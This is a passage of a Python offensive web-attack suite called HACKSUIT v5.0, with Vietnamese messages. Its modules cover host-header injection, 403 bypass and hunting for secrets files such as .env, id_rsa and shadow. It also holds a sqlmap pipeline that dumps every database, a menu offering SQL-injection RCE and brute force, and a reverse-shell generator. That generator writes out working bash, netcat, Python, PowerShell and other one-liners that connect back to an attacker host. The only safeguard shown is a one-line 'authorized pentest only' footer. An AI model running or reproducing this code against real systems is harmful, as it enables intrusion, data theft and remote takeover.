                    engine.findings.append({"url": t["url"], "param": t["param"], "type": "open_redirect",
                                            "payload": pl, "method": t["method"]})
                    break
    log("Open redirect scan xong.", "OK")

# ============================================================
#                    MODULE: HOST HEADER INJECTION
# ============================================================
def host_header_scan(engine):
    log("=== HOST HEADER INJECTION ===", "HOST")
    tests = [
        ("Host", "evil.com"),
        ("X-Forwarded-Host", "evil.com"),
        ("X-Forwarded-For", "127.0.0.1"),
        ("X-Original-URL", "/admin"),
        ("X-Rewrite-URL", "/admin"),
    ]
    for h, v in tests:
        r = engine.req(engine.url, headers={h: v})
        if r and (v in r.text or "evil.com" in r.text):
            log(f"[!] HOST HEADER: {h}={v} reflected", "VULN")
            engine.findings.append({"url": engine.url, "param": h, "type": "host_header",
                                    "payload": v, "method": "GET"})
    log("Host header scan xong.", "OK")

# ============================================================
#                    MODULE: 403 BYPASS
# ============================================================
BYPASS_HEADERS = [
    {"X-Original-URL": "/admin"},
    {"X-Rewrite-URL": "/admin"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-Host": "localhost"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
]
BYPASS_PATHS = ["/admin/","/admin/..;/","/./admin","//admin","/%2e/admin","/admin%20","/admin..;/"]

def bypass_403(engine):
    log("=== 403 BYPASS TESTING ===", "WAF")
    url = input("URL bị 403 (VD: http://site/admin): ").strip()
    if not url: return
    if not url.startswith("http"): url = engine.url.rstrip("/") + "/" + url.lstrip("/")
    base = engine.req(url)
    if base and base.status_code != 403:
        log(f"URL không trả 403 (status={base.status_code}).", "WARN"); return
    log(f"Base: 403 — thử bypass...", "OK")
    for h in BYPASS_HEADERS:
        r = engine.req(url, headers=h)
        if r and r.status_code not in (403, 404):
            log(f"[!] BYPASS OK header {list(h.keys())[0]} → {r.status_code}", "VULN")
    for p in BYPASS_PATHS:
        new_url = url.rstrip("/") + p
        r = engine.req(new_url)
        if r and r.status_code not in (403, 404):
            log(f"[!] BYPASS OK path {p} → {r.status_code}", "VULN")

# ============================================================
#                    MODULE: DIRECTORY FUZZ
# ============================================================
COMMON_DIRS = ["admin","administrator","login","wp-admin","phpmyadmin","backup",".git","config",
               "db","sql","test","dev","uploads",".env","robots.txt",".htaccess","server-status",
               "console","dashboard","user","install","setup","old",".svn","composer.json",
               "web.config","crossdomain.xml","sitemap.xml",".DS_Store","id_rsa","debug",
               "api","v1","v2","swagger","docs","graphql","metrics","health","status",
               "phpinfo.php","info.php","adminer.php","shell.php","cgi-bin","vendor",
               ".htpasswd",".ssh","passwd","shadow","auth","oauth","token","jwt"]
DIR_EXTS = ["", ".php", ".bak", ".old", ".txt", ".zip", ".sql", ".tar.gz", ".json", ".xml"]

def dir_fuzz(engine, threads=30):
    log("=== DIRECTORY FUZZING ===", "DIR")
    u = urlparse(engine.url)
    root = f"{u.scheme}://{u.netloc}"
    base = engine.req(root)
    base_status = base.status_code if base else 404
    found = []
    def probe(path):
        try:
            r = engine.s.get(f"{root}/{path}", timeout=5, allow_redirects=False)
            if r.status_code in (200, 301, 302, 401, 403) and r.status_code != base_status:
                return (path, r.status_code, len(r.text))
        except Exception: pass
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as ex:
        futs = [ex.submit(probe, d + e) for d in COMMON_DIRS for e in DIR_EXTS]
        for f in concurrent.futures.as_completed(futs):
            res = f.result()
            if res:
                path, code, size = res
                color = C['R'] if code in (200, 401, 403) else C['Y']
                print(f"  {color}[{code}]{C['W']} {root}/{path}  ({size} bytes)")
                found.append((path, code))
                if code == 200:
                    engine.findings.append({"url": f"{root}/{path}", "param": "-", "type": "dir", "method": "GET"})
    log(f"Dir fuzz xong — {len(found)} paths.", "OK")
    return found

# ============================================================
#                    MODULE: API DISCOVERY
# ============================================================
API_ENDPOINTS = ["/api","/api/v1","/api/v2","/api/v3","/rest","/graphql","/swagger",
                 "/swagger.json","/swagger-ui","/openapi.json","/api-docs","/docs",
                 "/redoc","/api/v1/users","/api/v1/login","/api/v1/admin","/api/v1/health",
                 "/api/v1/status","/api/v1/version","/api/v1/config","/api/v1/token",
                 "/api/v1/me","/api/v1/auth","/api/v1/register","/api/v1/profile"]

def api_scan(engine):
    log("=== API DISCOVERY ===", "API")
    found = []
    for ep in API_ENDPOINTS:
        url = urljoin(engine.url, ep)
        r = engine.req(url)
        if r and r.status_code in (200, 201, 400, 401, 403, 405):
            ct = r.headers.get("Content-Type", "")
            size = len(r.text)
            log(f"[{r.status_code}] {url} ({ct}) {size}b", "OK")
            found.append(url)
            if "json" in ct or "xml" in ct:
                engine.findings.append({"url": url, "param": "-", "type": "api",
                                        "payload": f"content-type={ct}", "method": "GET"})
    log(f"API scan xong — {len(found)} endpoints.", "OK")

# ============================================================
#                    MODULE: PORT SCAN
# ============================================================
def port_scan(engine, target=None):
    log("=== PORT SCAN ===", "NMAP")
    host = target or urlparse(engine.url).netloc.split(":")[0]
    try: host = socket.gethostbyname(host)
    except Exception: log(f"Không resolve: {host}", "WARN"); return
    if tool_exists("nmap"):
        subprocess.run(["nmap", "-sV", "-T4", "--top-ports", "1000", host])
    else:
        common = [21,22,23,25,53,80,110,135,139,143,443,445,1433,1521,3306,3389,5432,5900,6379,8080,8443,8888,27017]
        def scan(p):
            s = socket.socket(); s.settimeout(1)
            if s.connect_ex((host, p)) == 0:
                print(f"  {C['R']}[OPEN]{C['W']} {host}:{p}")
            s.close()
        with concurrent.futures.ThreadPoolExecutor(max_workers=30) as ex:
            list(ex.map(scan, common))

# ============================================================
#                    MODULE: SUBDOMAIN
# ============================================================
SUBS = ["www","mail","ftp","admin","portal","vpn","dev","test","staging","api","blog","shop",
        "cpanel","webmail","ns1","ns2","remote","git","jenkins","db","cloud","app","intranet",
        "m","mobile","static","cdn","img","images","assets","files","download","support",
        "help","docs","wiki","forum","community","store","beta","alpha","demo","sandbox"]

def subdomain_enum(engine):
    log("=== SUBDOMAIN ENUMERATION ===", "SUB")
    host = urlparse(engine.url).netloc.split(":")[0]
    parts = host.split(".")
    if len(parts) < 2: log("Domain không hợp lệ.", "WARN"); return
    base_domain = ".".join(parts[-2:])
    found = []
    def check(sub):
        fqdn = f"{sub}.{base_domain}"
        try:
            ip = socket.gethostbyname(fqdn)
            return (fqdn, ip)
        except socket.gaierror: return None
    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as ex:
        for r in ex.map(check, SUBS):
            if r:
                log(f"Tìm thấy: {r[0]} → {r[1]}", "OK")
                found.append(r)
                engine.findings.append({"url": r[0], "param": r[1], "type": "subdomain", "method": "-"})
    if not found: log("Không tìm thấy subdomain.", "WARN")
    return found

# ============================================================
#                    MODULE: CMS DETECT
# ============================================================
def cms_scan(engine):
    log("=== CMS / TECH DETECTION ===", "INFO")
    r = engine.req(engine.url)
    if not r: return
    html = r.text.lower()
    headers = {k.lower(): v for k, v in r.headers.items()}
    sigs = {
        "WordPress": ["wp-content","wp-json","wp-includes"],
        "Joomla": ["joomla","/components/com_"],
        "Drupal": ["drupal","/sites/default/"],
        "Magento": ["magento","mage/cookies"],
        "PrestaShop": ["prestashop"],
        "phpBB": ["phpbb"],
        "Laravel": ["laravel_session"],
        "Django": ["csrftoken"],
        "Flask": ["flask"],
        "Express": ["express"],
        "ASP.NET": ["asp.net","__viewstate"],
        "PHP": [".php"],
        "Node.js": ["node"],
    }
    for name, pats in sigs.items():
        for p in pats:
            if p in html or p in str(headers):
                log(f"CMS/Tech: {name}", "VULN"); break
    if "x-powered-by" in headers: log(f"Backend: {headers['x-powered-by']}", "OK")
    if "server" in headers: log(f"Server: {headers['server']}", "OK")
    for p in ["readme.html","wp-includes/js/version.js","CHANGELOG.txt",".env","robots.txt"]:
        rr = engine.s.get(urljoin(engine.url, p), timeout=5)
        if rr.status_code == 200 and len(rr.text) > 30:
            log(f"File lộ: {p} (200)", "WARN")
            engine.findings.append({"url": urljoin(engine.url, p), "param": "-",
                                    "type": "sensitive_file", "method": "GET"})

# ============================================================
#                    MODULE: SSL/TLS
# ============================================================
def ssl_scan(engine):
    log("=== SSL/TLS ANALYSIS ===", "SSL")
    u = urlparse(engine.url)
    if u.scheme != "https":
        log("Không phải HTTPS.", "WARN"); return
    host, port = u.hostname, (u.port or 443)
    try:
        ctx = ssl.create_default_context()
        with socket.create_connection((host, port), timeout=5) as sock:
            with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                cert = ssock.getpeercert()
                log(f"Protocol: {ssock.version()}", "OK")
                log(f"Cipher: {ssock.cipher()}", "OK")
                log(f"Subject: {dict(x[0] for x in cert['subject'])}", "OK")
                log(f"Issuer: {dict(x[0] for x in cert['issuer'])}", "OK")
                log(f"Expires: {cert['notAfter']}", "OK")
                if "TLSv1.1" in str(ssock.version()) or "TLSv1 " in str(ssock.version()):
                    log("[!] Giao thức TLS cũ!", "VULN")
    except Exception as e: log(f"SSL error: {e}", "WARN")

# ============================================================
#           MODULE: NIKTO + SQLMAP
# ============================================================
def run_nikto(url, html=False):
    if not tool_exists("nikto"): return
    ensure_dir(REPORT_DIR)
    host = f"{urlparse(url).scheme}://{urlparse(url).netloc}"
    if html:
        out = os.path.join(REPORT_DIR, f"nikto_{urlparse(url).netloc}_{int(time.time())}.html")
        log(f"Nikto full → {out}", "NIKTO")
        try:
            subprocess.run(["nikto","-h",host,"-Format","html","-o",out,"-nointeractive"],
                           capture_output=True, text=True, timeout=1800)
            log(f"Báo cáo: {out}", "OK")
        except Exception as e: log(f"Nikto error: {e}", "WARN")
    else:
        log(f"Nikto: {host}", "NIKTO")
        try:
            proc = subprocess.Popen(["nikto","-h",host,"-nointeractive"],
                                    stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            for line in proc.stdout: print(f"  nikto | {line.rstrip()}")
            proc.wait()
        except Exception as e: log(f"Nikto error: {e}", "WARN")

def build_sqlmap_cmd(t, extra=None):
    cmd = ["sqlmap","-u",t["url"],"--batch","--random-agent","--threads=4","--risk=2","--level=3"]
    if t.get("method") == "POST" and t.get("data"): cmd += ["--data", urlencode(t["data"])]
    if t.get("param") and t["param"] != "-": cmd += ["-p", t["param"]]
    if t.get("dbms"): cmd += ["--dbms", t["dbms"]]
    if PROXY: cmd += ["--proxy", PROXY]
    if COOKIE: cmd += ["--cookie", COOKIE]
    return cmd + (extra or [])

def sqlmap_pipeline(engine):
    if not tool_exists("sqlmap"): return
    sqli_f = [f for f in engine.findings if f.get("type","").startswith(("error","boolean","time"))]
    if not sqli_f: log("Chưa có SQLi — chạy [1].", "WARN"); return
    t = sqli_f[0]
    log("=== sqlmap PIPELINE ===", "SQLMAP")
    try:
        raw = subprocess.run(build_sqlmap_cmd(t, ["--dbs"]),
                             capture_output=True, text=True, timeout=3600).stdout or ""
    except subprocess.TimeoutExpired: log("Timeout.", "WARN"); return
    dbs = [re.sub(r"^\[\*\] ","",l).strip() for l in raw.splitlines() if re.match(r"^\[\*\] ",l)]
    if not dbs: log("Không list DB — dump-all.", "WARN")
    for db in dbs:
        log(f"Dump DB: {db}", "SQLMAP")
        try: subprocess.run(build_sqlmap_cmd(t, ["-D", db, "--dump-all"]), timeout=7200)
        except subprocess.TimeoutExpired: log(f"Timeout {db}.", "WARN")
    log("sqlmap xong.", "OK")

# ============================================================
#           MODULE: REVERSE SHELL GENERATOR
# ============================================================
def rev_shell_gen():
    log("=== REVERSE SHELL GENERATOR ===", "SHELL")
    ip = input("LHOST: ").strip()
    port = input("LPORT (4444): ").strip() or "4444"
    shell = f"""# === Reverse Shell Cheatsheet ===
# LHOST={ip} LPORT={port}

# Bash:
bash -i >& /dev/tcp/{ip}/{port} 0>&1
bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'

# Netcat:
nc -e /bin/sh {ip} {port}
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f

# Python:
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Perl:
perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'

# PHP:
php -r '$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");'

# PowerShell:
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){{;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1 | Out-String );$sendback2=$sendback+"PS "+(pwd).Path+"> ";$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'

# Java:
Runtime r = Runtime.getRuntime(); Process p = r.exec(new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done"});

# Ruby:
ruby -rsocket -e 'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# Listener:
nc -lvnp {port}
"""
    path = os.path.join(REPORT_DIR, f"revshell_{ip}_{port}.txt")
    ensure_dir(REPORT_DIR)
    with open(path, "w") as f: f.write(shell)
    print(shell)
    log(f"Đã lưu: {path}", "OK")

# ============================================================
#           MODULE: SCREENSHOT
# ============================================================
def screenshot_url(url, path="reports/screen.png"):
    try:
        ensure_dir(REPORT_DIR)
        # Thử selenium
        try:
            from selenium import webdriver
            from selenium.webdriver.chrome.options import Options
            opts = Options(); opts.add_argument("--headless"); opts.add_argument("--no-sandbox")
            d = webdriver.Chrome(options=opts)
            d.get(url); d.save_screenshot(path); d.quit()
            log(f"Screenshot: {path}", "SCREEN"); return path
        except ImportError:
            # Fallback: dùng subprocess wkhtmltoimage
            if shutil.which("wkhtmltoimage"):
                subprocess.run(["wkhtmltoimage", url, path], timeout=30)
                log(f"Screenshot (wkhtml): {path}", "SCREEN"); return path
            log("Cần: pip install selenium + chromedriver, hoặc apt install wkhtmltopdf", "WARN")
    except Exception as e: log(f"Screenshot error: {e}", "WARN")
    return None

# ============================================================
#           MODULE: HTML REPORT
# ============================================================
SEVERITY = {"rce":"CRITICAL","rce-time":"CRITICAL","error-based":"CRITICAL","lfi":"HIGH",
            "ssrf":"HIGH","ssrf-oob":"HIGH","boolean-based":"HIGH","time-based":"HIGH",
            "brute":"HIGH","xxe":"CRITICAL","ssti":"CRITICAL","nosql":"HIGH","jwt-brute":"CRITICAL",
            "graphql":"MEDIUM","cors":"HIGH","crlf":"MEDIUM","open_redirect":"MEDIUM",
            "host_header":"MEDIUM","api":"INFO","dir":"LOW","subdomain":"INFO",
            "sensitive_file":"HIGH","xss":"MEDIUM","csrf":"MEDIUM","csrf-novalidate":"MEDIUM",
            "info":"INFO"}
RISK_COLOR = {"CRITICAL":"danger","HIGH":"danger","MEDIUM":"warning","LOW":"info","INFO":"secondary"}

def export_html_report(engine, target_url=""):
    ensure_dir(REPORT_DIR)
    path = os.path.join(REPORT_DIR, f"report_{int(time.time())}.html")
    findings = sorted(engine.findings,
                      key=lambda f: {"CRITICAL":0,"HIGH":1,"MEDIUM":2,"LOW":3,"INFO":4}
                          .get(SEVERITY.get(f.get("type","info"),"INFO"), 5))
    counts = {}
    for f in engine.findings:
        s = SEVERITY.get(f.get("type","info"), "INFO")
        counts[s] = counts.get(s, 0) + 1
    rows = ""
    for i, f in enumerate(findings):
        vtype = f.get("type","info")
        sev = SEVERITY.get(vtype, "INFO")
        badge = RISK_COLOR.get(sev, "secondary")
        rows += f"""<tr>
          <td>{i+1}</td>
          <td><span class="badge bg-{badge}">{sev}</span></td>
          <td><span class="badge bg-dark">{vtype}</span></td>
          <td><code>{f.get('method','-')}</code></td>
          <td style="word-break:break-all">{f.get('url','')[:90]}</td>
          <td><code>{f.get('param','-')}</code></td>
          <td style="word-break:break-all"><code>{f.get('payload','-')[:150]}</code></td>
        </tr>"""
    count_html = " ".join(
        f'<span class="badge bg-{RISK_COLOR.get(s,"secondary")}">{s}: {n}</span>'
        for s, n in sorted(counts.items()))
    html = f"""<!DOCTYPE html>
<html lang="vi"><head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
<title>HACKSUIT v5.0 — Pentest Report</title>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
<style>body{{background:#1a1a2e;color:#eee}}.card{{background:#16213e;border:1px solid #0f3460}}.table{{color:#eee}}h1{{color:#e94560}}code{{color:#f39c12}}</style>
</head><body><div class="container py-4">
  <h1>⚡ HACKSUIT v5.0 ULTIMATE — Báo cáo Pentest</h1>
  <div class="card mb-3"><div class="card-body">
    <p><strong>Target:</strong> {target_url or engine.url or 'N/A'}</p>
    <p><strong>Thời gian:</strong> {time.strftime('%Y-%m-%d %H:%M:%S')}</p>
    <p><strong>WAF:</strong> {engine.waf or 'Không phát hiện'}</p>
    <p><strong>Tổng findings:</strong> {len(engine.findings)} &nbsp; {count_html}</p>
  </div></div>
  <div class="card mb-3"><div class="card-body table-responsive">
    <h5>Danh sách phát hiện</h5>
    <table class="table table-striped table-hover">
      <thead><tr><th>#</th><th>Mức độ</th><th>Loại</th><th>Method</th><th>URL</th><th>Param</th><th>Payload</th></tr></thead>
      <tbody>{rows or '<tr><td colspan="7" class="text-center">Không có findings.</td></tr>'}</tbody>
    </table>
  </div></div>
  <div class="card"><div class="card-body">
    <h5>Khuyến nghị remediation</h5>
    <ul>
      <li><strong>SQLi/NoSQL:</strong> prepared statements, ORM, validate input.</li>
      <li><strong>XSS:</strong> escape output theo context, CSP header.</li>
      <li><strong>LFI/RCE:</strong> whitelist path, không gọi shell với input.</li>
      <li><strong>SSRF:</strong> whitelist outbound, chặn 169.254.169.254.</li>
      <li><strong>XXE:</strong> tắt external entity trong XML parser.</li>
      <li><strong>SSTI:</strong> sandbox template engine, không cho user input.</li>
      <li><strong>JWT:</strong> dùng RS256, không cho alg=none.</li>
      <li><strong>CORS:</strong> whitelist origin, không wildcard + credentials.</li>
      <li><strong>CSRF:</strong> token per-session, SameSite=Strict.</li>
    </ul>
  </div></div>
  <p class="text-muted mt-3 text-center">Generated by HACKSUIT v5.0 — Chỉ dùng cho pentest được ủy quyền</p>
</div></body></html>"""
    with open(path, "w", encoding="utf-8") as f: f.write(html)
    log(f"Đã xuất báo cáo HTML: {path}", "OK")
    try: webbrowser.open(f"file://{os.path.abspath(path)}")
    except Exception: pass
    return path

def export_json_report(engine):
    path = os.path.join(REPORT_DIR, f"report_{int(time.time())}.json")
    data = {
        "target": engine.url, "waf": engine.waf, "dbms": engine.dbms,
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        "findings": engine.findings
    }
    with open(path, "w", encoding="utf-8") as f: json.dump(data, f, indent=2, ensure_ascii=False)
    log(f"JSON: {path}", "OK"); return path

def export_csv_report(engine):
    path = os.path.join(REPORT_DIR, f"report_{int(time.time())}.csv")
    with open(path, "w", newline="", encoding="utf-8") as f:
        w = csv.writer(f)
        w.writerow(["#","Type","Severity","Method","URL","Param","Payload"])
        for i, x in enumerate(engine.findings, 1):
            sev = SEVERITY.get(x.get("type","info"), "INFO")
            w.writerow([i, x.get("type"), sev, x.get("method"), x.get("url"), x.get("param"), x.get("payload")])
    log(f"CSV: {path}", "OK"); return path

# ============================================================
#           MAIN / MENU
# ============================================================
engine = None

def pick_target(targets):
    for i, t in enumerate(targets):
        print(f"  [{i}] {t.get('method','-'):4} {t.get('param','-'):15} {t.get('type','')}")
    idx = input("Số thứ tự (default 0): ").strip()
    try: return targets[int(idx) if idx else 0]
    except (IndexError, ValueError): return targets[0]

def ask_url():
    if not engine.url:
        u = input(f"{C['Y']}Nhập URL đích: {C['W']}").strip()
        if not u: return False
        if not u.startswith(("http://","https://")): u = "http://" + u
        engine.url = u
        log(f"Target: {u}", "OK")
    return True

def show_findings():
    if not engine.findings: log("Chưa có findings.", "WARN"); return
    print(f"\n{C['G']}--- FINDINGS ({len(engine.findings)}) ---{C['W']}")
    for i, f in enumerate(engine.findings):
        sev = SEVERITY.get(f.get("type","info"), "INFO")
        print(f"  [{i}] {sev:8} {f.get('type','?'):15} {f.get('param','-'):15} {f.get('url','')[:60]}")
        if f.get("payload"): print(f"      payload: {f['payload'][:100]}")

def run_full_auto():
    log("=== CHẠY TẤT CẢ ===", "OK")
    engine.detect_waf()
    dir_fuzz(engine); subdomain_enum(engine); cms_scan(engine); api_scan(engine)
    ssl_scan(engine)
    xss_scan(engine); lfi_scan(engine); ssrf_scan(engine); csrf_check(engine)
    xxe_scan(engine); ssti_scan(engine); nosql_scan(engine); graphql_scan(engine)
    cors_scan(engine); crlf_scan(engine); open_redirect_scan(engine); host_header_scan(engine)
    ts = engine.extract_params()
    for t in ts:
        res = engine.sqli_detect(t)
        if res:
            t.update(res); engine.findings.append(t)
            engine.dbms = engine.dbms or res["dbms"]
            log(f"[!] SQLi: {t['param']} — {res['type']} ({res['dbms']})", "VULN")
    sqlmap_pipeline(engine)
    show_findings()
    export_html_report(engine, target_url=engine.url)
    export_json_report(engine)
    export_csv_report(engine)
    log("=== HOÀN TẤT ===", "OK")

def main():
    global PROXY, COOKIE, AUTH, engine
    requests.packages.urllib3.disable_warnings()
    parser = argparse.ArgumentParser(description="HACKSUIT v5.0 ULTIMATE")
    parser.add_argument("url", nargs="?", default=None)
    parser.add_argument("-c", "--cookie")
    parser.add_argument("-p", "--proxy")
    parser.add_argument("--auth", help="user:pass Basic Auth")
    args = parser.parse_args()
    PROXY = args.proxy
    COOKIE = args.cookie
    if args.auth and ":" in args.auth:
        u, p = args.auth.split(":", 1); AUTH = (u, p)
    engine = Engine(args.url, cookie=COOKIE)
    banner()
    for tool in ["nikto","sqlmap","nmap","hydra","whatweb"]:
        tool_exists(tool)

    while True:
        print(f"""
{C['G']}========== HACKSUIT v5.0 ULTIMATE =========={C['W']}
 Target: {engine.url or f"{C['Y']}chưa đặt{C['W']}"}
 WAF: {engine.waf or '—'}
--- Thiết lập ---
 [99] Đặt/đổi URL                    [2]  Xem findings
--- SQLi engine ---
 [1]  Quét SQLi toàn params          [3]  Full auto-exploit SQLi
 [4]  DB info                        [5]  List databases
 [6]  List tables                    [7]  List columns
 [8]  DUMP data                      [9]  Boolean-blind extract
 [10] Đọc file (LOAD_FILE)           [11] WAF bypass
 [12] Payload thủ công               [30] MySQL RCE (INTO OUTFILE)
 [31] MSSQL RCE (xp_cmdshell)
--- Web attacks ---
 [13] XSS Scanner                    [14] LFI / RFI Scanner
 [15] Command Injection              [27] SSRF (OOB webhook)
 [28] CSRF Token Check               [32] XXE Scanner
 [33] SSTI Scanner                   [34] NoSQL Injection
 [35] JWT Attack (alg none + brute)  [36] GraphQL Discovery
 [37] CORS Misconfig                 [38] CRLF Injection
 [39] Open Redirect                  [40] Host Header Injection
 [41] 403 Bypass
--- Recon ---
 [16] Directory Fuzzing              [17] Port Scan
 [18] Subdomain Enumeration          [19] CMS/Tech Detection
 [42] API Discovery                  [43] SSL/TLS Analysis
 [44] WAF Detection
--- Tools ngoài ---
 [20] Nikto scan nhanh               [21] Nikto full HTML
 [22] sqlmap auto-detect             [23] sqlmap FULL pipeline
 [24] Brute-force Login (Hydra)
--- Khác ---
 [45] Reverse Shell Generator        [46] Screenshot URL
 [25] CHẠY TẤT CẢ + xuất report
 [29] Xuất HTML Report               [47] Xuất JSON Report
 [48] Xuất CSV Report                [26] Xem reports/
 [0]  Thoát""")
        ch = input("Chọn: ").strip()
        need_url = ch in ("1","13","14","15","16","17","18","19","20","21","22","25","27","28","32","33","34","36","37","38","39","40","42","43","44","24","46")
        if need_url and not ask_url(): continue

        if ch == "99": engine.url = None; ask_url()
        elif ch == "1":
            ts = engine.extract_params()
            log(f"{len(ts)} param(s)", "OK")
            engine.findings = [f for f in engine.findings if not f.get("type","").startswith(("error","boolean","time"))]
            for t in ts:
                res = engine.sqli_detect(t)
                if res:
                    t.update(res); engine.findings.append(t)
                    engine.dbms = engine.dbms or res["dbms"]
                    log(f"[!] SQLi: {t['param']} — {res['type']} ({res['dbms']})", "VULN")
        elif ch == "2": show_findings()
        elif ch in ("3","4","5","6","7","8","9","10","11","12","30","31"):
            sqli_f = [f for f in engine.findings if f.get("type","").startswith(("error","boolean","time"))]
            if not sqli_f: log("Chưa có SQLi — chạy [1].", "WARN"); continue
            t = sqli_f[0] if len(sqli_f)==1 else pick_target(sqli_f)
            engine.current = t
            if ch == "3":
                r = engine.inject(t, "'")
                engine.dbms = engine.dbms or (engine.detect_dbms(r.text) if r else None)
                engine.waf_bypass()
                if engine.find_union(): engine.sqli_info()
            elif ch in ("4","5","6","7","8"):
                if engine.ncols is None and not engine.find_union(): continue
                if ch == "4": engine.sqli_info()
                elif ch == "5": engine.sqli_dbs()
                elif ch == "6": engine.sqli_tables(input("DB (Enter=current): ").strip() or None)
                elif ch == "7": engine.sqli_cols(input("Table: ").strip())
                elif ch == "8":
                    tbl = input("Table: ").strip()
                    cols = input("Columns (comma): ").strip().split(",")
                    engine.sqli_dump(tbl, cols)
            elif ch == "9":
                q = input("Query blind: ").strip()
                result = ""
                for i in range(1, 200):
                    ok = False
                    for c in (string.ascii_letters + string.digits + "@._-{}$!#%^&*()"):
                        r1 = engine.send(f"' AND ASCII(SUBSTRING(({q}),{i},1))={ord(c)}-- -")
                        r2 = engine.send(f"' AND ASCII(SUBSTRING(({q}),{i},1))=0-- -")
                        if r1 and r2 and len(r1.text) != len(r2.text):
                            result += c; sys.stdout.write(c); sys.stdout.flush(); ok = True; break
                    if not ok: break
                print(f"\n  => {result or '(fail)'}")
            elif ch == "10":
                if engine.ncols is None: engine.find_union()
                engine.sqli_readfile(input("Path: ").strip())
            elif ch == "11": engine.waf_bypass()
            elif ch == "12":
                r = engine.send(input("Payload: ").strip())
                print(r.text[:3000] if r else "No response")
            elif ch == "30": engine.sqli_rce_mysql()
            elif ch == "31": engine.sqli_mssql_rce(input("Command (whoami): ").strip() or "whoami")
        elif ch == "13": xss_scan(engine)
        elif ch == "14": lfi_scan(engine)
        elif ch == "15": lfi_scan(engine)
        elif ch == "27":
            token = input("Webhook.site token (Enter = internal only): ").strip()
            ssrf_scan(engine, oob_token=token or None)
        elif ch == "28": csrf_check(engine)
        elif ch == "32": xxe_scan(engine)
        elif ch == "33": ssti_scan(engine)
        elif ch == "34": nosql_scan(engine)
        elif ch == "35": jwt_scan(engine)
        elif ch == "36": graphql_scan(engine)
        elif ch == "37": cors_scan(engine)
        elif ch == "38": crlf_scan(engine)
        elif ch == "39": open_redirect_scan(engine)
        elif ch == "40": host_header_scan(engine)
        elif ch == "41": bypass_403(engine)
        elif ch == "16": dir_fuzz(engine)
        elif ch == "17": port_scan(engine)
        elif ch == "18": subdomain_enum(engine)
        elif ch == "19": cms_scan(engine)
        elif ch == "42": api_scan(engine)
        elif ch == "43": ssl_scan(engine)
        elif ch == "44": engine.detect_waf()
        elif ch == "20": run_nikto(engine.url, html=False)
        elif ch == "21": run_nikto(engine.url, html=True)
        elif ch == "22":
            if shutil.which("sqlmap"):
                try: subprocess.run(["sqlmap","-u",engine.url,"--batch","--random-agent"], timeout=3600)
                except subprocess.TimeoutExpired: log("sqlmap timeout.", "WARN")
        elif ch == "23": sqlmap_pipeline(engine)
        elif ch == "24":
            if tool_exists("hydra"):
                log("Dùng brute_login() (đã tích hợp ở trên).", "OK")
        elif ch == "25": run_full_auto()
        elif ch == "29": export_html_report(engine, target_url=engine.url)
        elif ch == "45": rev_shell_gen()
        elif ch == "46":
            p = screenshot_url(engine.url)
            if p: log(f"Screenshot: {p}", "OK")
        elif ch == "47": export_json_report(engine)
        elif ch == "48": export_csv_report(engine)
        elif ch == "26":
            found = False
            for root, _, files in os.walk(REPORT_DIR):
                for f in files:
                    print(f"  {os.path.join(root,f)}"); found = True
            if not found: log("reports/ trống.", "WARN")
        elif ch == "0": print("Bye."); sys.exit(0)
        else: log("Lựa chọn không hợp lệ.", "WARN")

if __name__ == "__main__":
    main()